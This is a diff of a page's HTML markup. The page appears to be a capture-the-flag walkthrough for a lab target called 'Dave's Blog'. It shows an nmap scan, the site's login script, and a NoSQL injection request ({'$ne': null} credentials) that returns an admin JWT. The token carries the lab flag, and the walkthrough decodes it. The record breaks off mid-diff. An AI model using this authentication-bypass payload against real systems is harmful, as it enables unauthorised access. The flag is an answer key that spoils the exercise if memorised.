@@ -122,226 +122,226 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 f9:31:1f:9f:b4:a1:10:9d:a9:69:ec:d5:97:df:1a:34 (RSA)
-|   256 e9:f5:b9:9e:39:33:00:d2:7f:cf:75:0f:7a:6d:1c:d3 (ECDSA)
-|_  256 44:f2:51:7f:de:78:94:b2:75:2b:a8:fe:25:18:51:49 (ED25519)
-80/tcp   open  http    nginx 1.14.0 (Ubuntu)
-|_http-server-header: nginx/1.14.0 (Ubuntu)
-| http-robots.txt: 1 disallowed entry 
-|_/admin
-|_http-title: Dave's Blog
-3000/tcp open  http    Node.js (Express middleware)
-|_http-title: Dave's Blog
-| http-robots.txt: 1 disallowed entry 
-|_/admin
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose|phone
-Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%), Google Android 10.X (91%)
-OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:google:android:10 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
-Aggressive OS guesses: Linux 4.15 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 3 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span><span class="w">     </span><span class="nx">OpenSSH</span><span class="w"> </span><span class="m m-Double">7.6</span><span class="nx">p1</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="w"> </span><span class="mi">4</span><span class="nx">ubuntu0</span><span class="m m-Double">.3</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">protocol</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">2048</span><span class="w"> </span><span class="nx">f9</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">1</span><span class="nx">f</span><span class="p">:</span><span class="mi">9</span><span class="nx">f</span><span class="p">:</span><span class="nx">b4</span><span class="p">:</span><span class="nx">a1</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">9</span><span class="nx">d</span><span class="p">:</span><span class="nx">a9</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="nx">ec</span><span class="p">:</span><span class="nx">d5</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="nx">df</span><span class="p">:</span><span class="mi">1</span><span class="nx">a</span><span class="p">:</span><span class="mi">34</span><span class="w"> </span><span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
+<span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="nx">e9</span><span class="p">:</span><span class="nx">f5</span><span class="p">:</span><span class="nx">b9</span><span class="p">:</span><span class="mi">9</span><span class="nx">e</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="nx">d2</span><span class="p">:</span><span class="mi">7</span><span class="nx">f</span><span class="p">:</span><span class="nx">cf</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="mi">0</span><span class="nx">f</span><span class="p">:</span><span class="mi">7</span><span class="nx">a</span><span class="p">:</span><span class="mi">6</span><span class="nx">d</span><span class="p">:</span><span class="mi">1</span><span class="nx">c</span><span class="p">:</span><span class="nx">d3</span><span class="w"> </span><span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">44</span><span class="p">:</span><span class="nx">f2</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">7</span><span class="nx">f</span><span class="p">:</span><span class="nx">de</span><span class="p">:</span><span class="mi">78</span><span class="p">:</span><span class="mi">94</span><span class="p">:</span><span class="nx">b2</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="mi">2</span><span class="nx">b</span><span class="p">:</span><span class="nx">a8</span><span class="p">:</span><span class="nx">fe</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">49</span><span class="w"> </span><span class="p">(</span><span class="nx">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">    </span><span class="nx">nginx</span><span class="w"> </span><span class="m m-Double">1.14.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">nginx</span><span class="o">/</span><span class="m m-Double">1.14.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">robots</span><span class="p">.</span><span class="nx">txt</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">disallowed</span><span class="w"> </span><span class="nx">entry</span><span class="w"> </span>
+<span class="o">|</span><span class="nx">_</span><span class="o">/</span><span class="nx">admin</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Dave</span><span class="err">&#39;</span><span class="nx">s</span><span class="w"> </span><span class="nx">Blog</span>
+<span class="mi">3000</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">    </span><span class="nx">Node</span><span class="p">.</span><span class="nx">js</span><span class="w"> </span><span class="p">(</span><span class="nx">Express</span><span class="w"> </span><span class="nx">middleware</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Dave</span><span class="err">&#39;</span><span class="nx">s</span><span class="w"> </span><span class="nx">Blog</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">robots</span><span class="p">.</span><span class="nx">txt</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">disallowed</span><span class="w"> </span><span class="nx">entry</span><span class="w"> </span>
+<span class="o">|</span><span class="nx">_</span><span class="o">/</span><span class="nx">admin</span>
+<span class="nx">Warning</span><span class="p">:</span><span class="w"> </span><span class="nx">OSScan</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">may</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">unreliable</span><span class="w"> </span><span class="nx">because</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">could</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">least</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">open</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">port</span>
+<span class="nx">Device</span><span class="w"> </span><span class="k">type</span><span class="p">:</span><span class="w"> </span><span class="nx">general</span><span class="w"> </span><span class="nx">purpose</span><span class="o">|</span><span class="nx">phone</span>
+<span class="nx">Running</span><span class="w"> </span><span class="p">(</span><span class="nx">JUST</span><span class="w"> </span><span class="nx">GUESSING</span><span class="p">):</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="mi">4</span><span class="p">.</span><span class="nx">X</span><span class="o">|</span><span class="m m-Double">2.6</span><span class="p">.</span><span class="nx">X</span><span class="o">|</span><span class="mi">3</span><span class="p">.</span><span class="nx">X</span><span class="o">|</span><span class="mi">5</span><span class="p">.</span><span class="nx">X</span><span class="w"> </span><span class="p">(</span><span class="mi">97</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Google</span><span class="w"> </span><span class="nx">Android</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="nx">X</span><span class="w"> </span><span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">)</span>
+<span class="nx">OS</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span><span class="p">:</span><span class="m m-Double">4.15</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">google</span><span class="p">:</span><span class="nx">android</span><span class="p">:</span><span class="mi">10</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span><span class="p">:</span><span class="mi">4</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span><span class="p">:</span><span class="m m-Double">2.6</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span><span class="p">:</span><span class="mi">3</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span><span class="p">:</span><span class="mi">5</span>
+<span class="nx">Aggressive</span><span class="w"> </span><span class="nx">OS</span><span class="w"> </span><span class="nx">guesses</span><span class="p">:</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">4.15</span><span class="w"> </span><span class="p">(</span><span class="mi">97</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Android</span><span class="w"> </span><span class="mi">9</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="p">(</span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">4.9</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">4.14</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">2.6.32</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">3.13</span><span class="w"> </span><span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">3.10</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">4.11</span><span class="w"> </span><span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">3.2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">4.14</span><span class="w"> </span><span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">4.15</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">5.19</span><span class="w"> </span><span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">2.6.32</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">3.10</span><span class="w"> </span><span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">5.4</span><span class="w"> </span><span class="p">(</span><span class="mi">90</span><span class="o">%</span><span class="p">)</span>
+<span class="nx">No</span><span class="w"> </span><span class="nx">exact</span><span class="w"> </span><span class="nx">OS</span><span class="w"> </span><span class="nx">matches</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="p">(</span><span class="nx">test</span><span class="w"> </span><span class="nx">conditions</span><span class="w"> </span><span class="nx">non</span><span class="o">-</span><span class="nx">ideal</span><span class="p">).</span>
+<span class="nx">Network</span><span class="w"> </span><span class="nx">Distance</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="nx">hops</span>
+<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>&lt;script&gt;
-    if(document.location.hash) {
-      const div = document.createElement('div')
-      div.innerText = decodeURIComponent(document.location.hash.substr(1));
-      div.className = 'note';
-      document.body.insertBefore(div, document.body.firstChild);
-    }
-    document.querySelector('form').onsubmit = (e) =&gt; {
-      /*e.preventDefault();
-      const username = document.querySelector('input[type=text]').value;
-      const password = document.querySelector('input[type=password]').value;
-      fetch('', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({username, password})
-      }).then(() =&gt; {
-        location.reload();
-      })
-      return false;*/
-    }
-  &lt;/script&gt;
-&lt;
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">document</span><span class="o">.</span><span class="n">location</span><span class="o">.</span><span class="n">hash</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">const</span><span class="w"> </span><span class="n">div</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">document</span><span class="o">.</span><span class="n">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">)</span>
+<span class="w">      </span><span class="n">div</span><span class="o">.</span><span class="n">innerText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">decodeURIComponent</span><span class="p">(</span><span class="n">document</span><span class="o">.</span><span class="n">location</span><span class="o">.</span><span class="n">hash</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+<span class="w">      </span><span class="n">div</span><span class="o">.</span><span class="n">className</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;note&#39;</span><span class="p">;</span>
+<span class="w">      </span><span class="n">document</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">insertBefore</span><span class="p">(</span><span class="n">div</span><span class="p">,</span><span class="w"> </span><span class="n">document</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">firstChild</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">document</span><span class="o">.</span><span class="n">querySelector</span><span class="p">(</span><span class="s1">&#39;form&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">onsubmit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="o">/*</span><span class="n">e</span><span class="o">.</span><span class="n">preventDefault</span><span class="p">();</span>
+<span class="w">      </span><span class="k">const</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">document</span><span class="o">.</span><span class="n">querySelector</span><span class="p">(</span><span class="s1">&#39;input[type=text]&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">value</span><span class="p">;</span>
+<span class="w">      </span><span class="k">const</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">document</span><span class="o">.</span><span class="n">querySelector</span><span class="p">(</span><span class="s1">&#39;input[type=password]&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">value</span><span class="p">;</span>
+<span class="w">      </span><span class="n">fetch</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">method</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+<span class="w">        </span><span class="n">headers</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="n">body</span><span class="p">:</span><span class="w"> </span><span class="n">JSON</span><span class="o">.</span><span class="n">stringify</span><span class="p">({</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">})</span>
+<span class="w">      </span><span class="p">})</span><span class="o">.</span><span class="n">then</span><span class="p">(()</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">location</span><span class="o">.</span><span class="n">reload</span><span class="p">();</span>
+<span class="w">      </span><span class="p">})</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span><span class="o">*/</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+<span class="o">&lt;</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>POST /admin HTTP/1.1
-Host: dblog.thm
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/json
-DNT: 1
-Sec-GPC: 1
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-If-None-Match: W/&quot;4e6-U9SczEF/N4gIGd+2/xSd9iZzGO0&quot;
-Priority: u=0, i
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/admin</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">dblog.thm</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+<span class="na">DNT</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">Sec-GPC</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">If-None-Match</span><span class="o">:</span> <span class="l">W/&quot;4e6-U9SczEF/N4gIGd+2/xSd9iZzGO0&quot;</span>
+<span class="na">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
 
-{&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null}}
+<span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">},</span><span class="w"> </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">}}</span>
 
----------------------------------------------------------------------------
-HTTP/1.1 302 Found
-Server: nginx/1.14.0 (Ubuntu)
-Date: Fri, 02 Jan 2026 12:14:17 GMT
-Content-Type: text/html; charset=utf-8
-Content-Length: 56
-Connection: close
-X-Powered-By: Express
-Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE3NjczNTYwNTd9.3uhowHBsgrc7Y9W1SK1mJ8OXKhC_TtujmS7QT6z2JZc; Path=/
-Location: /admin
-Vary: Accept
+<span class="mi">---------------------------------------------------------------------------</span>
+<span class="err">HTTP/</span><span class="mf">1.1</span><span class="w"> </span><span class="mi">302</span><span class="w"> </span><span class="err">Fou</span><span class="kc">n</span><span class="err">d</span>
+<span class="err">Server</span><span class="p">:</span><span class="w"> </span><span class="kc">n</span><span class="err">gi</span><span class="kc">n</span><span class="err">x/</span><span class="mf">1.14.0</span><span class="w"> </span><span class="err">(Ubu</span><span class="kc">ntu</span><span class="err">)</span>
+<span class="err">Da</span><span class="kc">te</span><span class="p">:</span><span class="w"> </span><span class="err">Fri</span><span class="p">,</span><span class="w"> </span><span class="mi">02</span><span class="w"> </span><span class="err">Ja</span><span class="kc">n</span><span class="w"> </span><span class="mi">2026</span><span class="w"> </span><span class="mi">12</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">17</span><span class="w"> </span><span class="err">GMT</span>
+<span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Type</span><span class="p">:</span><span class="w"> </span><span class="kc">te</span><span class="err">x</span><span class="kc">t</span><span class="err">/h</span><span class="kc">t</span><span class="err">ml;</span><span class="w"> </span><span class="err">charse</span><span class="kc">t</span><span class="err">=u</span><span class="kc">tf</span><span class="mi">-8</span>
+<span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Le</span><span class="kc">n</span><span class="err">g</span><span class="kc">t</span><span class="err">h</span><span class="p">:</span><span class="w"> </span><span class="mi">56</span>
+<span class="err">Co</span><span class="kc">nne</span><span class="err">c</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="p">:</span><span class="w"> </span><span class="err">close</span>
+<span class="err">X</span><span class="mi">-</span><span class="err">Powered</span><span class="mi">-</span><span class="err">By</span><span class="p">:</span><span class="w"> </span><span class="err">Express</span>
+<span class="err">Se</span><span class="kc">t</span><span class="mi">-</span><span class="err">Cookie</span><span class="p">:</span><span class="w"> </span><span class="err">jw</span><span class="kc">t</span><span class="err">=eyJhbGciOiJIUzI</span><span class="mi">1</span><span class="err">NiIsI</span><span class="kc">n</span><span class="err">R</span><span class="mi">5</span><span class="err">cCI</span><span class="mi">6</span><span class="err">IkpXVCJ</span><span class="mf">9.e</span><span class="err">yJpc</span><span class="mi">0</span><span class="err">FkbWluIjp</span><span class="mi">0</span><span class="err">c</span><span class="kc">n</span><span class="err">VlLCJ</span><span class="kc">fa</span><span class="err">WQiOiI</span><span class="mi">1</span><span class="err">ZWM</span><span class="mi">2</span><span class="err">ZTVjZjFkYzRkMzY</span><span class="mi">0</span><span class="err">YmY</span><span class="mi">4</span><span class="err">NjQxMDciLCJ</span><span class="mi">1</span><span class="err">c</span><span class="mi">2</span><span class="err">VybmF</span><span class="kc">t</span><span class="err">ZSI</span><span class="mi">6</span><span class="err">ImRhdmUiLCJwYXNzd</span><span class="mi">29</span><span class="err">yZCI</span><span class="mi">6</span><span class="err">IlRITX</span><span class="kc">t</span><span class="err">TdXBlclNlY</span><span class="mi">3</span><span class="err">VyZUFkbWluUGFzc</span><span class="mi">3</span><span class="err">dvcmQxMjN</span><span class="mi">9</span><span class="err">IiwiX</span><span class="mi">192</span><span class="err">IjowLCJpYXQiOjE</span><span class="mi">3</span><span class="err">NjczNTYwNTd</span><span class="mf">9.3</span><span class="err">uhowHBsgrc</span><span class="mi">7</span><span class="err">Y</span><span class="mi">9</span><span class="err">W</span><span class="mi">1</span><span class="err">SK</span><span class="mi">1</span><span class="err">mJ</span><span class="mi">8</span><span class="err">OXKhC_T</span><span class="kc">tu</span><span class="err">jmS</span><span class="mi">7</span><span class="err">QT</span><span class="mi">6</span><span class="err">z</span><span class="mi">2</span><span class="err">JZc;</span><span class="w"> </span><span class="err">Pa</span><span class="kc">t</span><span class="err">h=/</span>
+<span class="err">Loca</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="p">:</span><span class="w"> </span><span class="err">/admi</span><span class="kc">n</span>
+<span class="err">Vary</span><span class="p">:</span><span class="w"> </span><span class="err">Accep</span><span class="kc">t</span>
 
-&lt;p&gt;Found. Redirecting to &lt;a href=&quot;/admin&quot;&gt;/admin&lt;/a&gt;&lt;/p&gt;
+<span class="err">&lt;p&gt;Fou</span><span class="kc">n</span><span class="err">d.</span><span class="w"> </span><span class="err">Redirec</span><span class="kc">t</span><span class="err">i</span><span class="kc">n</span><span class="err">g</span><span class="w"> </span><span class="kc">t</span><span class="err">o</span><span class="w"> </span><span class="err">&lt;a</span><span class="w"> </span><span class="err">hre</span><span class="kc">f</span><span class="err">=</span><span class="s2">&quot;/admin&quot;</span><span class="err">&gt;/admi</span><span class="kc">n</span><span class="err">&lt;/a&gt;&lt;/p&gt;</span>
 
----------------------------------------------------------------------------
+<span class="mi">---------------------------------------------------------------------------</span>
 
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE3NjczNTYwNTd9.3uhowHBsgrc7Y9W1SK1mJ8OXKhC_TtujmS7QT6z2JZc
+<span class="err">eyJhbGciOiJIUzI</span><span class="mi">1</span><span class="err">NiIsI</span><span class="kc">n</span><span class="err">R</span><span class="mi">5</span><span class="err">cCI</span><span class="mi">6</span><span class="err">IkpXVCJ</span><span class="mf">9.e</span><span class="err">yJpc</span><span class="mi">0</span><span class="err">FkbWluIjp</span><span class="mi">0</span><span class="err">c</span><span class="kc">n</span><span class="err">VlLCJ</span><span class="kc">fa</span><span class="err">WQiOiI</span><span class="mi">1</span><span class="err">ZWM</span><span class="mi">2</span><span class="err">ZTVjZjFkYzRkMzY</span><span class="mi">0</span><span class="err">YmY</span><span class="mi">4</span><span class="err">NjQxMDciLCJ</span><span class="mi">1</span><span class="err">c</span><span class="mi">2</span><span class="err">VybmF</span><span class="kc">t</span><span class="err">ZSI</span><span class="mi">6</span><span class="err">ImRhdmUiLCJwYXNzd</span><span class="mi">29</span><span class="err">yZCI</span><span class="mi">6</span><span class="err">IlRITX</span><span class="kc">t</span><span class="err">TdXBlclNlY</span><span class="mi">3</span><span class="err">VyZUFkbWluUGFzc</span><span class="mi">3</span><span class="err">dvcmQxMjN</span><span class="mi">9</span><span class="err">IiwiX</span><span class="mi">192</span><span class="err">IjowLCJpYXQiOjE</span><span class="mi">3</span><span class="err">NjczNTYwNTd</span><span class="mf">9.3</span><span class="err">uhowHBsgrc</span><span class="mi">7</span><span class="err">Y</span><span class="mi">9</span><span class="err">W</span><span class="mi">1</span><span class="err">SK</span><span class="mi">1</span><span class="err">mJ</span><span class="mi">8</span><span class="err">OXKhC_T</span><span class="kc">tu</span><span class="err">jmS</span><span class="mi">7</span><span class="err">QT</span><span class="mi">6</span><span class="err">z</span><span class="mi">2</span><span class="err">JZc</span>
 
-{
-  &quot;isAdmin&quot;: true,
-  &quot;_id&quot;: &quot;5ec6e5cf1dc4d364bf864107&quot;,
-  &quot;username&quot;: &quot;dave&quot;,
-  &quot;password&quot;: &quot;THM{SuperSe...dminPass...}&quot;,
-  &quot;__v&quot;: 0,
-  &quot;iat&quot;: 1767356057
-}
-</code></pre>
+<span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;isAdmin&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
